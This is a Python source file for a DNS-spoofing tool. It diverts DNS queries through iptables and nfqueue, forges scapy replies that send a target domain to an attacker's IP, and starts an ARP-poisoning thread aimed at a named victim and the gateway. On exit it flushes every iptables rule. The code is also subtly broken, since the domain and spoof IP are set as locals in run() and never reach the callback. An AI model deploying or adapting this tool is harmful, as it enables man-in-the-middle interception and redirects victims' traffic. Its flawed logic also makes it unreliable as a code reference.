import nfqueue
from scapy.all import *
import os
import socket
import sys
import threading
from utils.poison_gateway_router import poison_gateway_router
domain = None
spoof_ip = None
os.system('iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE')

def callback(payload):
    data = payload.get_data()
    pkt = IP(data)
    if not pkt.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        if domain in pkt[DNS].qd.qname:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(str(spoofed_pkt)))
            print("[+] Sent spoofed packet for %s" % domain)

def main():
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        q.try_run()  # Main loop
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        os.system('iptables -F')
        os.system('iptables -X')
        
        sys.exit('Closing...')

def run(args):
    domain = args.domain
    spoof_ip = args.spoof_ip
    poison_thread = threading.Thread(target=poison_gateway_router, args=(args.victim_ip, args.victim_mac, args.attacker_mac, args.interface))
    poison_thread.start()

    main()
